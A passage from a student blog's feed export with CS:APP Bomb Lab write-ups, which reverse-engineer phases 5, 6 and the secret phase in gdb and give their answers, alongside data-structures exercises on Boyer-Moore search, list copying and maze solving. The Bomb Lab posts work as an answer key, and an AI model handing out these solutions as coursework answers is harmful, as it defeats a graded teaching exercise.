class="line"><span class="hljs-variable">$6</span> = 0x603430</span><br><span class="line">(gdb) p/x *(0x603430)</span><br><span class="line"><span class="hljs-variable">$7</span> = 0x1d1</span><br><span class="line">(gdb) p/x *(0x603430 + 8)</span><br><span class="line"><span class="hljs-variable">$8</span> = 0x603440</span><br><span class="line">(gdb) p/x *(0x603440)</span><br><span class="line"><span class="hljs-variable">$9</span> = 0x174</span><br><span class="line">(gdb) p/x *(0x603440 + 8)</span><br><span class="line"><span class="hljs-variable">$10</span> = 0x603450</span><br><span class="line">(gdb) p/x *(0x603450)</span><br><span class="line"><span class="hljs-variable">$11</span> = 0x220</span><br><span class="line">(gdb) p/x *(0x603450 + 8)</span><br><span class="line"><span class="hljs-variable">$12</span> = 0x603460</span><br><span class="line">(gdb) p/x *(0x603460 + 8)</span><br><span class="line"><span class="hljs-variable">$13</span> = 0x0</span><br></pre></td></tr></table></figure></p><p>故答案应为6 5 3 1 2 4;  </p><h3 id="secret-phase"><a href="#secret-phase" class="headerlink" title="secret_phase"></a>secret_phase</h3><p>正常通过前6关是无法触发secret_phase的,查看汇编发现,在phase_4答案之后输入DrEvil即可进入secret_phase.<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disas secret_phase </span><br><span class="line">Dump of assembler code <span class="hljs-keyword">for</span> <span class="hljs-keyword">function</span> secret_phase:</span><br><span class="line">   0x0000000000401191 &lt;+0&gt;:push   %rbx</span><br><span class="line">   0x0000000000401192 &lt;+1&gt;:callq  0x40155c &lt;read_line&gt;</span><br><span class="line">   0x0000000000401197 &lt;+6&gt;:mov    <span class="hljs-variable">$0xa</span>,%edx</span><br><span class="line">   0x000000000040119c &lt;+11&gt;:mov    <span class="hljs-variable">$0x0</span>,%esi</span><br><span class="line">   0x00000000004011a1 &lt;+16&gt;:mov    %rax,%rdi</span><br><span class="line">   0x00000000004011a4 &lt;+19&gt;:callq  0x400b80 &lt;strtol@plt&gt;</span><br><span class="line">   0x00000000004011a9 &lt;+24&gt;:mov    %rax,%rbx</span><br><span class="line">   0x00000000004011ac &lt;+27&gt;:lea    -0x1(%rax),%eax</span><br><span class="line">   0x00000000004011af &lt;+30&gt;:cmp    <span class="hljs-variable">$0x3e8</span>,%eax</span><br><span class="line">   0x00000000004011b4 &lt;+35&gt;:jbe    0x4011bb &lt;secret_phase+42&gt;</span><br><span class="line">   0x00000000004011b6 &lt;+37&gt;:callq  0x4014e4 &lt;explode_bomb&gt;</span><br><span class="line">   0x00000000004011bb &lt;+42&gt;:mov    %ebx,%esi</span><br><span class="line">   0x00000000004011bd &lt;+44&gt;:mov    <span class="hljs-variable">$0x603230</span>,%edi</span><br><span class="line">   0x00000000004011c2 &lt;+49&gt;:callq  0x401153 &lt;fun7&gt;</span><br><span class="line">   0x00000000004011c7 &lt;+54&gt;:cmp    <span class="hljs-variable">$0x4</span>,%eax</span><br><span class="line">   0x00000000004011ca &lt;+57&gt;:je     0x4011d1 &lt;secret_phase+64&gt;</span><br><span class="line">   0x00000000004011cc &lt;+59&gt;:callq  0x4014e4 &lt;explode_bomb&gt;</span><br><span class="line">   0x00000000004011d1 &lt;+64&gt;:mov    <span class="hljs-variable">$0x4024d0</span>,%edi</span><br><span class="line">   0x00000000004011d6 &lt;+69&gt;:callq  0x400ac0 &lt;puts@plt&gt;</span><br><span class="line">   0x00000000004011db &lt;+74&gt;:callq  0x401682 &lt;phase_defused&gt;</span><br><span class="line">   0x00000000004011e0 &lt;+79&gt;:pop    %rbx</span><br><span class="line">   0x00000000004011e1 &lt;+80&gt;:retq   </span><br><span class="line">---Type &lt;<span class="hljs-built_in">return</span>&gt; to <span class="hljs-built_in">continue</span>, or q &lt;<span class="hljs-built_in">return</span>&gt; to quit---</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure></p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disas fun7</span><br><span class="line">Dump of assembler code <span class="hljs-keyword">for</span> <span class="hljs-keyword">function</span> fun7:</span><br><span class="line">   0x0000000000401153 &lt;+0&gt;:sub    <span class="hljs-variable">$0x8</span>,%rsp</span><br><span class="line">   0x0000000000401157 &lt;+4&gt;:<span class="hljs-built_in">test</span>   %rdi,%rdi</span><br><span class="line">   0x000000000040115a &lt;+7&gt;:je     0x401187 &lt;fun7+52&gt;</span><br><span class="line">   0x000000000040115c &lt;+9&gt;:mov    (%rdi),%edx</span><br><span class="line">   0x000000000040115e &lt;+11&gt;:cmp    %esi,%edx</span><br><span class="line">   0x0000000000401160 &lt;+13&gt;:jle    0x40116f &lt;fun7+28&gt;</span><br><span class="line">   0x0000000000401162 &lt;+15&gt;:mov    0x8(%rdi),%rdi</span><br><span class="line">   0x0000000000401166 &lt;+19&gt;:callq  0x401153 &lt;fun7&gt;</span><br><span class="line">   0x000000000040116b &lt;+24&gt;:add    %eax,%eax</span><br><span class="line">   0x000000000040116d &lt;+26&gt;:jmp    0x40118c &lt;fun7+57&gt;</span><br><span class="line">   0x000000000040116f &lt;+28&gt;:mov    <span class="hljs-variable">$0x0</span>,%eax</span><br><span class="line">   0x0000000000401174 &lt;+33&gt;:cmp    %esi,%edx</span><br><span class="line">   0x0000000000401176 &lt;+35&gt;:je     0x40118c &lt;fun7+57&gt;</span><br><span class="line">   0x0000000000401178 &lt;+37&gt;:mov    0x10(%rdi),%rdi</span><br><span class="line">   0x000000000040117c &lt;+41&gt;:callq  0x401153 &lt;fun7&gt;</span><br><span class="line">   0x0000000000401181 &lt;+46&gt;:lea    0x1(%rax,%rax,1),%eax</span><br><span class="line">   0x0000000000401185 &lt;+50&gt;:jmp    0x40118c &lt;fun7+57&gt;</span><br><span class="line">   0x0000000000401187 &lt;+52&gt;:mov    <span class="hljs-variable">$0xffffffff</span>,%eax</span><br><span class="line">   0x000000000040118c &lt;+57&gt;:add    <span class="hljs-variable">$0x8</span>,%rsp</span><br><span class="line">   0x0000000000401190 &lt;+61&gt;:retq   </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>此题题意为在一个题目中构建好的平衡二叉树中从根节点开始查找一个输入的数.<br>由节点向左为0,由节点向右为1,查找路径序的0-1列从右向左构成一个二进制数,该<br>二进制数的十进制值必须等于题目中提供的数,其为4,那么所需查找路径序列为100,<br>根据二叉树结构,应该查找7,故答案为7.</p><h3 id="运行截图"><a href="#运行截图" class="headerlink" title="运行截图"></a>运行截图</h3><p><img src="/2018/12/01/Bomb_lab2/ret1.png" alt="结果"></p>]]></content>
      
      
      <categories>
          
          <category> CS:APP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CS:APP </tag>
            
            <tag> 汇编 </tag>
            
            <tag> 二进制炸弹 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>DS_exp3</title>
      <link href="/2018/12/01/DS_exp3/"/>
      <url>/2018/12/01/DS_exp3/</url>
      
        <content type="html"><![CDATA[<h3 id="设计思路"><a href="#设计思路" class="headerlink" title="设计思路"></a>设计思路</h3><a id="more"></a><p>BM算法是一种后缀匹配算法,其具有比KMP算法更优秀的性能表现.其核心思想有二<br>,第一是坏字符,坏字符就是pattern与text从右往左第一失配的在text中的字符,<br>二是好后缀,好后缀就是pattern与text从右往左连续匹配成功的子串.对于坏字符<br>和好后缀,有各自的模式串移动规则,可以确定各自失配时需要移动的位数,最终选<br>择二者中移动位数较大者移动.在主函数中,让用户输入文档名与需要查找的单词.<br>每次从文档中读取一行进行匹配搜索,每次使用BM算法搜索完成后,若搜索到单词,<br>则将主串中开始匹配的位置定为查找到单词的下一行,使用BM算法进行下一个匹配<br>搜索,直至搜索完当前行.而后循环直至匹配完整个文档.</p><h3 id="代码说明"><a href="#代码说明" class="headerlink" title="代码说明"></a>代码说明</h3><figure class="highlight cpp hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span>* <span class="hljs-title">CreateBC</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* pattern, <span class="hljs-keyword">int</span> len)</span></span>;</span><br></pre></td></tr></table></figure><p>传入模式串及其长度,返回根据坏字符的跳转数组.<br><figure class="highlight cpp hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span>* <span class="hljs-title">CreateSuffix</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* pattern, <span class="hljs-keyword">int</span> len)</span></span>;</span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span>* <span class="hljs-title">CreateGS</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* pattern, <span class="hljs-keyword">int</span> len)</span></span>;</span><br></pre></td></tr></table></figure></p><p>两个函数都需要传入模式串及其长度,第一个函数返回其后缀数组,第二个函数调<br>用第一个函数返回根据好后缀的跳转数组.<br><figure class="highlight cpp hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">bm_search</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* text, <span class="hljs-keyword">int</span> text_len, <span class="hljs-keyword">char</span>* pattern, <span class="hljs-keyword">int</span> pattern_len, <span class="hljs-keyword">int</span> *bc, <span class="hljs-keyword">int</span> *gs)</span></span>;</span><br></pre></td></tr></table></figure></p><p>传入主串及其长度,模式串及其长度,坏字符跳转数组,好后缀跳转数组.返回在主串<br>中查找到模式串的第一个位置,未查找到,则返回-1.<br><figure class="highlight cpp hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">char</span>* <span class="hljs-title">get_line</span><span class="hljs-params">(FILE *article, <span class="hljs-keyword">char</span> (&amp;text)[<span class="hljs-number">1000</span>])</span></span>;</span><br></pre></td></tr></table></figure></p><p>从给定的article文件中读取最大1000字符的一行,存在text位置,读取到文件末尾<br>则返回NULL.</p><h3 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h3><p><img src="/2018/12/01/DS_exp3/ret.png" alt="运行结果"></p><p>此为从马丁路德金的I hava a dream演讲稿中查找dream得出的结果.</p>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 串匹配 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>DS_work2</title>
      <link href="/2018/11/16/DS_work2/"/>
      <url>/2018/11/16/DS_work2/</url>
      
        <content type="html"><![CDATA[<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><a id="more"></a><figure class="highlight cpp hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">GList_copy</span><span class="hljs-params">(GList L, GList &amp;N)</span></span></span><br><span class="line"><span class="hljs-function"></span>&#123;</span><br><span class="line">    <span class="hljs-comment">//非空表则进入</span></span><br><span class="line">    <span class="hljs-keyword">if</span>(L)</span><br><span class="line">    &#123;</span><br><span class="line">        N = <span class="hljs-keyword">new</span> GLNode;</span><br><span class="line">        <span class="hljs-keyword">if</span>(!N) <span class="hljs-comment">//未分配空间</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="hljs-built_in">exit</span>(OVERFLOW);</span><br><span class="line">        &#125;</span><br><span class="line">        N-&gt;tag = L-&gt;tag; <span class="hljs-comment">//复制标志位</span></span><br><span class="line">        <span class="hljs-keyword">if</span>(L-&gt;tag==ATOM)    <span class="hljs-comment">//如果是原子</span></span><br><span class="line">        &#123;    </span><br><span class="line">            N-&gt;atom = L-&gt;atom;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="hljs-keyword">else</span>            <span class="hljs-comment">//复制表头</span></span><br><span class="line">        &#123;</span><br><span class="line">            GList_copy(L-&gt;hp, N-&gt;hp);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="hljs-keyword">if</span>(!(L-&gt;tp))    <span class="hljs-comment">//表尾为空，则递归完表</span></span><br><span class="line">        &#123;</span><br><span class="line">            N-&gt;tp=<span class="hljs-literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="hljs-keyword">else</span>            <span class="hljs-comment">//复制表尾</span></span><br><span class="line">        &#123;</span><br><span class="line">            GList_copy(L-&gt;tp, N-&gt;tp);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 广义表 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>DS_exp2</title>
      <link href="/2018/11/10/DS_exp2/"/>
      <url>/2018/11/10/DS_exp2/</url>
      
        <content type="html"><![CDATA[<h3 id="设计思路"><a href="#设计思路" class="headerlink" title="设计思路"></a>设计思路</h3><a id="more"></a><h4 id="图编号"><a href="#图编号" class="headerlink" title="图编号"></a>图编号</h4><p><img src="/2018/11/10/DS_exp2/graph.png" alt="图编号"><br>如图所示，从上到下，从左到右，给17个顶点进行编号，以两个顶点代表一条边，例入2-3代表可以从顶点2走到顶点3。问题即为求解从2 -&gt; 17的通路。</p><h4 id="求解思想"><a href="#求解思想" class="headerlink" title="求解思想"></a>求解思想</h4><p>求解一条通路，应当从起点出发，不断前进到后续可行顶点，当在一个顶点无法继续前进时，则回退到上一个顶点，寻找其他可行顶点，直到到达终点。此思想符合数据结构栈的特点。首先将起点压栈，然后将从当前顶点可到达的一个顶点压栈，然后将该顶点标记为已访问，随后到达下一个顶点，在某个顶点无法继续走通时，将当前顶点出栈，回退到上一个顶点重新选择可以到达的且未访问的顶点。如此循环，直到终点被压入栈中，此时栈中所有顶点即为一条通路。</p><p>求解一条最短路径，应当从起点出发，访问所有可以到达的下一级顶点。再从所有下一级顶点出发，访问所有可访问的再下一级顶点，如此循环，每一级顶点距起点距离相同。过程中记录路线。此想法符合数据结构中队列的特点。首先，将起点入队。然后将队头元素出队，将该元素可访问到的且未被访问的顶点置为已访问，然后入队，注意记录被入队节点的前一个节点。直到队列为空。最后顺着终点的前驱顶点输出即可得到路线。若有多个终点，要寻找到最近的终点出去，则将结束循环条件改为有终点入队即可。</p><h3 id="代码说明"><a href="#代码说明" class="headerlink" title="代码说明"></a>代码说明</h3><h4 id="结构体及全局变量定义"><a href="#结构体及全局变量定义" class="headerlink" title="结构体及全局变量定义"></a>结构体及全局变量定义</h4><figure class="highlight cpp hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">p</span>    //表示顶点,用于寻找最短路径时记录路径</span></span><br><span class="line"><span class="hljs-class">&#123;</span></span><br><span class="line">    <span class="hljs-keyword">int</span> code;</span><br><span class="line">    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">p</span>* <span class="hljs-title">pre</span>;</span>  <span class="hljs-comment">//前一个顶点</span></span><br><span class="line">&#125; Ver;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> edge_cnt = <span class="hljs-number">29</span>;    <span class="hljs-comment">//边的数量</span></span><br><span class="line"><span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> ver_cnt = <span class="hljs-number">17</span>;     <span class="hljs-comment">//顶点数量</span></span><br><span class="line"><span class="hljs-keyword">int</span> <span class="hljs-built_in">map</span>[edge_cnt][<span class="hljs-number">2</span>];       <span class="hljs-comment">//记录边</span></span><br><span class="line"><span class="hljs-keyword">int</span> my_stack[MAX] = &#123;<span class="hljs-number">0</span>&#125;;    <span class="hljs-comment">//数组模拟栈</span></span><br><span class="line"><span class="hljs-keyword">int</span> my_quque[MAX] = &#123;<span class="hljs-number">0</span>&#125;;    <span class="hljs-comment">//数组模拟队列</span></span><br><span class="line"><span class="hljs-keyword">int</span> top = <span class="hljs-number">0</span>;                <span class="hljs-comment">//栈顶指示</span></span><br><span class="line"><span class="hljs-keyword">int</span> front = <span class="hljs-number">0</span>, rear = <span class="hljs-number">0</span>;    <span class="hljs-comment">//队列首位指示</span></span><br><span class="line"><span class="hljs-keyword">bool</span> visit[ver_cnt + <span class="hljs-number">1</span>] = &#123;<span class="hljs-literal">false</span>&#125;;  <span class="hljs-comment">//记录点是否访问过</span></span><br><span class="line">Ver vers[ver_cnt + <span class="hljs-number">1</span>];              <span class="hljs-comment">//每个点路径链表头结点</span></span><br></pre></td></tr></table></figure><h4 id="函数定义"><a href="#函数定义" class="headerlink" title="函数定义"></a>函数定义</h4><figure class="highlight cpp hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">loadmaze</span><span class="hljs-params">()</span></span>;            <span class="hljs-comment">//读入迷宫地图</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">visited</span><span class="hljs-params">(<span class="hljs-keyword">int</span> i)</span></span>;        <span class="hljs-comment">//将点i状态置为访问过</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">isvisited</span><span class="hljs-params">(<span class="hljs-keyword">int</span> i)</span></span>;      <span class="hljs-comment">//判断点i是否访问过</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">hasway</span><span class="hljs-params">(<span class="hljs-keyword">int</span> s)</span></span>;         <span class="hljs-comment">//从点s出发是否有没去过的可行路径</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">find_way</span><span class="hljs-params">(<span class="hljs-keyword">int</span> start, <span class="hljs-keyword">int</span> end)</span></span>;      <span class="hljs-comment">//找到一条通路</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">find_least</span><span class="hljs-params">(<span class="hljs-keyword">int</span> start, <span class="hljs-keyword">int</span> end)</span></span>;    <span class="hljs-comment">//找到一条最短路径</span></span><br></pre></td></tr></table></figure><h3 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h3><p><img src="/2018/11/10/DS_exp2/ret.png" alt="运行结果"></p><h3 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h3><p>本次实验，求解迷宫通路和最短通路，在不利用递归的情况下，使用模拟的栈和队列，实现了深度优先搜索和广度优先搜索。加强了对于栈和队列的理解以及使用熟练度。</p>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Stack </tag>
            
            <tag> Queue </tag>
            
            <tag> 迷宫问题 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Bomb_lab</title>
      <link href="/2018/11/09/Bomb_lab/"/>
      <url>/2018/11/09/Bomb_lab/</url>
      
        <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/deepmind210/article/details/83316486" target="_blank" rel="noopener">phase_1 - Phase_4</a><br><a id="more"></a></p><h3 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h3><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">disas phase_5</span><br></pre></td></tr></table></figure><p>生成下面的汇编代码，可见，需要读入一个长度为6的字符串<br><figure class="highlight pf hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-number">0</span>x0000000000401062 <span class="hljs-variable">&lt;+0&gt;</span>:     push   %rbx</span><br><span class="line"><span class="hljs-number">0</span>x0000000000401063 <span class="hljs-variable">&lt;+1&gt;</span>:     sub    <span class="hljs-variable">$0x20</span>,%rsp</span><br><span class="line"><span class="hljs-number">0</span>x0000000000401067 <span class="hljs-variable">&lt;+5&gt;</span>:     mov    %rdi,%rbx</span><br><span class="line"><span class="hljs-number">0</span>x000000000040106a <span class="hljs-variable">&lt;+8&gt;</span>:     mov    %fs:<span class="hljs-number">0</span>x28,%rax</span><br><span class="line"><span class="hljs-number">0</span>x0000000000401073 <span class="hljs-variable">&lt;+17&gt;</span>:    mov    %rax,<span class="hljs-number">0</span>x18(%rsp)</span><br><span class="line"><span class="hljs-number">0</span>x0000000000401078 <span class="hljs-variable">&lt;+22&gt;</span>:    xor    %eax,%eax</span><br><span class="line"><span class="hljs-number">0</span>x000000000040107a <span class="hljs-variable">&lt;+24&gt;</span>:    callq  <span class="hljs-number">0</span>x40131b <span class="hljs-variable">&lt;string_length&gt;</span></span><br><span class="line"><span class="hljs-number">0</span>x000000000040107f <span class="hljs-variable">&lt;+29&gt;</span>:    cmp    <span class="hljs-variable">$0x6</span>,%eax</span><br><span class="line"><span class="hljs-number">0</span>x0000000000401082 <span class="hljs-variable">&lt;+32&gt;</span>:    je     <span class="hljs-number">0</span>x4010d2 <span class="hljs-variable">&lt;phase_5+112&gt;</span></span><br><span class="line"><span class="hljs-number">0</span>x0000000000401084 <span class="hljs-variable">&lt;+34&gt;</span>:    callq  <span class="hljs-number">0</span>x40143a <span class="hljs-variable">&lt;explode_bomb&gt;</span></span><br></pre></td></tr></table></figure></p><p>从下面这段，是一个循环，对输入字符串进行一个变换，得到s.其变换为是<code>s[i] = p[input[i] &amp; 0xf]</code>，p是程序内含的一个模式串.<br><figure class="highlight perl hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-number">0x000000000040108b</span> &lt;+<span class="hljs-number">41</span>&gt;:    movzbl (%rbx,%rax,<span class="hljs-number">1</span>),%ecx</span><br><span class="line"><span class="hljs-number">0x000000000040108f</span> &lt;+<span class="hljs-number">45</span>&gt;:    mov    %cl,(%rsp)</span><br><span class="line"><span class="hljs-number">0x0000000000401092</span> &lt;+<span class="hljs-number">48</span>&gt;:    mov    (%rsp),%rdx</span><br><span class="line"><span class="hljs-number">0x0000000000401096</span> &lt;+<span class="hljs-number">52</span>&gt;:    <span class="hljs-keyword">and</span>    $0xf,%edx</span><br><span class="line"><span class="hljs-number">0x0000000000401099</span> &lt;+<span class="hljs-number">55</span>&gt;:    movzbl <span class="hljs-number">0x4024b0</span>(%rdx),%edx</span><br><span class="line"><span class="hljs-number">0x00000000004010a0</span> &lt;+<span class="hljs-number">62</span>&gt;:    mov    %dl,<span class="hljs-number">0x10</span>(%rsp,%rax,<span class="hljs-number">1</span>)</span><br><span class="line"><span class="hljs-number">0x00000000004010a4</span> &lt;+<span class="hljs-number">66</span>&gt;:    add    $0x1,%rax</span><br><span class="line"><span class="hljs-number">0x00000000004010a8</span> &lt;+<span class="hljs-number">70</span>&gt;:    cmp    $0x6,%rax</span><br><span class="line"><span class="hljs-number">0x00000000004010ac</span> &lt;+<span class="hljs-number">74</span>&gt;:    jne    <span class="hljs-number">0x40108b</span> &lt;phase_5+<span class="hljs-number">41</span>&gt;</span><br></pre></td></tr></table></figure></p><p>程序中提到了0x4024b0这个地址，由于&amp;0xf意味取取其低4位值，因为模式串长度应为16，我们查看这个串.<br><figure class="highlight cpp hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x /<span class="hljs-number">16</span>c <span class="hljs-number">0x4024b0</span></span><br><span class="line"><span class="hljs-number">0x4024b0</span> &lt;<span class="hljs-built_in">array</span><span class="hljs-number">.3449</span>&gt;:  <span class="hljs-number">109</span> <span class="hljs-string">'m'</span> <span class="hljs-number">97</span> <span class="hljs-string">'a'</span>  <span class="hljs-number">100</span> <span class="hljs-string">'d'</span> <span class="hljs-number">117</span> <span class="hljs-string">'u'</span> <span class="hljs-number">105</span> <span class="hljs-string">'i'</span> <span class="hljs-number">101</span> <span class="hljs-string">'e'</span> <span class="hljs-number">114</span> <span class="hljs-string">'r'</span> <span class="hljs-number">115</span> <span class="hljs-string">'s'</span></span><br><span class="line"><span class="hljs-number">0x4024b8</span> &lt;<span class="hljs-built_in">array</span><span class="hljs-number">.3449</span>+<span class="hljs-number">8</span>&gt;:        <span class="hljs-number">110</span> <span class="hljs-string">'n'</span> <span class="hljs-number">102</span> <span class="hljs-string">'f'</span> <span class="hljs-number">111</span> <span class="hljs-string">'o'</span> <span class="hljs-number">116</span> <span class="hljs-string">'t'</span> <span class="hljs-number">118</span> <span class="hljs-string">'v'</span> <span class="hljs-number">98</span> <span class="hljs-string">'b'</span>  <span class="hljs-number">121</span> <span class="hljs-string">'y'</span> <span class="hljs-number">108</span> <span class="hljs-string">'l'</span></span><br></pre></td></tr></table></figure></p><p>继续看汇编代码,发现将生成的s与另一个位于0x4025be的字符串进行比较，必须相等.<br><figure class="highlight x86asm hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-number">0x00000000004010b3</span> &lt;+<span class="hljs-number">81</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-number">$0</span>x40245e,%esi</span><br><span class="line"><span class="hljs-number">0x00000000004010b8</span> &lt;+<span class="hljs-number">86</span>&gt;:    <span class="hljs-keyword">lea</span>    <span class="hljs-number">0x10</span>(%rsp),%rdi</span><br><span class="line"><span class="hljs-number">0x00000000004010bd</span> &lt;+<span class="hljs-number">91</span>&gt;:    callq  <span class="hljs-number">0x401338</span> &lt;strings_not_equal&gt;</span><br><span class="line"><span class="hljs-number">0x00000000004010c2</span> &lt;+<span class="hljs-number">96</span>&gt;:    <span class="hljs-keyword">test</span>   %eax,%eax</span><br><span class="line"><span class="hljs-number">0x00000000004010c4</span> &lt;+<span class="hljs-number">98</span>&gt;:    <span class="hljs-keyword">je</span>     <span class="hljs-number">0x4010d9</span> &lt;phase_5+<span class="hljs-number">119</span>&gt;</span><br><span class="line"><span class="hljs-number">0x00000000004010c6</span> &lt;+<span class="hljs-number">100</span>&gt;:   callq  <span class="hljs-number">0x40143a</span> &lt;explode_bomb&gt;</span><br></pre></td></tr></table></figure></p><p>我们查看另一个串,可指其为flyers.<br><figure class="highlight gcode hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">(gdb)</span> x /<span class="hljs-number">6</span>c <span class="hljs-number">0</span>x<span class="hljs-number">40245</span>e</span><br><span class="line"><span class="hljs-number">0</span>x<span class="hljs-number">40245</span>e:       <span class="hljs-number">102</span> <span class="hljs-string">'f'</span> <span class="hljs-number">108</span> <span class="hljs-string">'l'</span> <span class="hljs-number">121</span> <span class="hljs-string">'y'</span> <span class="hljs-number">101</span> <span class="hljs-string">'e'</span> <span class="hljs-number">114</span> <span class="hljs-string">'r'</span> <span class="hljs-number">115</span> <span 